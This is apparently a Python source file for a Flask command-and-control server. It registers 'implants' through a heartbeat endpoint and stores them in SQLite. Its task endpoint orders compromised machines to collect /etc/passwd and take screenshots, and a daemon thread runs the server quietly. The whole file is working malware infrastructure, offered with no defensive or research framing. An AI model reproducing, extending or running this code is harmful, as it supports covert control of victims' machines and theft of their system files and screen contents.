from flask import Flask, request, jsonify
import sqlite3
from config import settings, paths
import threading


class C2Server:
    def __init__(self):
        self.app = Flask(__name__)
        self.app.config['JSONIFY_PRETTYPRINT_REGULAR'] = False
        self._init_db()
        self._setup_routes()

    def _init_db(self):
        with sqlite3.connect(f'{settings.DATA_DIR}/c2.db') as conn:
            conn.execute('''CREATE TABLE IF NOT EXISTS implants
                         (id TEXT PRIMARY KEY, last_seen REAL)''')

    def _setup_routes(self):
        @self.app.route('/heartbeat', methods=['POST'])
        def heartbeat():
            implant_id = request.json.get('id')
            with sqlite3.connect(f'{settings.DATA_DIR}/c2.db') as conn:
                conn.execute('INSERT OR REPLACE INTO implants VALUES (?, strftime("%s","now"))',
                             (implant_id,))
            return '', 204

        @self.app.route('/tasks', methods=['GET'])
        def get_tasks():
            return jsonify({
                "tasks": [
                    {"action": "collect", "target": "/etc/passwd"},
                    {"action": "screenshot", "delay": 300}
                ]
            })

    def run(self):
        """启动低资源消耗服务"""
        server_thread = threading.Thread(
            target=self.app.run,
            kwargs={
                'host': settings.C2_IP,
                'port': settings.C2_PORT,
                'threaded': True,
                'use_reloader': False
            }
        )
        server_thread.daemon = True
        server_thread.start()